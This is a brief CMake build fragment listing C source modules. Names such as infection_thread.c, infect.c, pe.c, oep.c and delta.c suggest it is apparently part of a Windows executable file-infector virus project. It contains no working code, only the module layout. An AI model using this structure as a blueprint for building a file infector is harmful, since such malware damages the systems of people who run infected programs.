add_sources(code_begin.c)

add_sources(
  code_begin.c
  infection_thread.c
  infect.c
  utility.c
  pe.c
  oep.c
  function.c
  delta.c
  checksum.c
  process_info.c
  memory.c)

add_subdirectory(disasm)
add_subdirectory(block)

add_sources(code_end.c)
